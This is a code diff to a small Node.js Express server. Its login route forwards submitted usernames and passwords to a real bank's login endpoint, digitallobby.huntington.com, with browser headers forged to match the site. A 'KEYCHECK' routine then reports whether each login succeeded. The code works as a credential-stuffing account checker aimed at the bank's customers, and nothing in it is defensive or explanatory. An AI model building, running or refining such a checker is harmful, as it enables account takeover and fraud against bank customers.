@@ -12,6 +12,7 @@ app.get("/", (req, res) => {
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
+  // التحقق من البيانات
   if (!username || !password) {
     return res.status(400).json({
       success: false,
@@ -29,21 +30,12 @@ app.post("/login", async (req, res) => {
       }).toString(),
       {
         headers: {
-          "Host": "digitallobby.huntington.com",
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Encoding": "gzip, deflate, br, zstd",
-          "Accept-Language": "en-US,en;q=0.9",
           "Content-Type": "application/x-www-form-urlencoded",
+          "Accept": "application/json, text/plain, */*",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
           "Origin": "https://digitallobby.huntington.com",
-          "Referer": "https://digitallobby.huntington.com/login",
-          "Sec-CH-UA": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-          "Sec-CH-UA-Mobile": "?0",
-          "Sec-CH-UA-Platform": '"Windows"',
-          "Sec-Fetch-Dest": "empty",
-          "Sec-Fetch-Mode": "cors",
-          "Sec-Fetch-Site": "same-origin",
-          "User-Agent": getRandomUA(),
-          "Priority": "u=1, i"
+          "Referer": "https://digitallobby.huntington.com/login"
         },
         timeout: 15000
       }
@@ -54,7 +46,7 @@ app.post("/login", async (req, res) => {
         ? response.data
         : JSON.stringify(response.data);
 
-    // KEYCHECK logic
+    // KEYCHECK
     if (body.includes('"operation" : "login_success"')) {
       return res.json({
         success: true,
@@ -82,6 +74,7 @@ app.post("/login", async (req, res) => {
   }
 });
 
+// تشغيل السيرفر
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log("Server running on port", PORT);
